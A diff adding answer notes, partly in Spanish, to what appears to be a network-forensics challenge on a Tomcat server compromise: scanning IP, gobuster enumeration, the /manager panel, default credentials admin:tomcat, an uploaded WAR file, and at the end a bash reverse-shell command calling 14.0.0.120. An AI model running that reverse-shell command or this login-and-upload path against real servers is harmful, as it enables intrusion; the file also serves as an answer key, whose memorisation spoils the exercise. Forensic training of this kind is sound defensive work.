@@ -1,0 +1,37 @@
+
+1 - Given the suspicious activity detected on the web server, the pcap analysis shows a series of requests across various ports, suggesting a potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?
+14.0.0.120
+utilizando network miner, esra la ip con mas paquetes enviado y recividos que no fuera de una ip dentro de la red 
+tambien podemo ver nmamao en su descripcion "p0f (NetSA): *NMAP syn scan (5) [*NMAP] (100.00 %) "
+---
+
+2 - Based on the identified IP address associated with the attacker, can you ascertain the city from which the attacker's activities originated?
+Guangzhou
+utilizando alguna paguina como "https://www.ip2location.io/" es posible extraer la informacion de la ip, como la dirrecion completa
+
+---
+3 - From the pcap analysis, multiple open ports were detected as a result of the attacker's activitie scan. Which of these ports provides access to the web server admin panel?
+8080
+port 8080 can be used to run web servers for remote managment
+
+----
+
+4 -Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?
+gobuster
+the ip used gobusterm and is a tool used to brute-force URIs including directories and files as well as DNS subdomains.
+-----
+***5- Subsequent to their efforts to enumerate directories on our web server, the attacker made numerous requests trying to identify administrative interfaces. Which specific directory associated with the admin panel was the attacker able to uncover?
+/manager
+in the files section /manager is the forder that the atacker tries to upload a file /manager/....
+----
+6- Upon accessing the admin panel, the attacker made attempts to brute-force the login credentials. From the data, can you identify the correct username and password combination that the attacker successfully used for authorization?
+admin:tomcat
+in the credentials setion we can see which credentials the attacker tried to use admin:tomcat was the last try, thus the password and user that worked for them
+-----
+7- 
+Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?
+JXQOZY.war
+in the files section we can see 14.0.0.120 as source only once trying to upload the JXQOZY.war file
+
+8
+/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
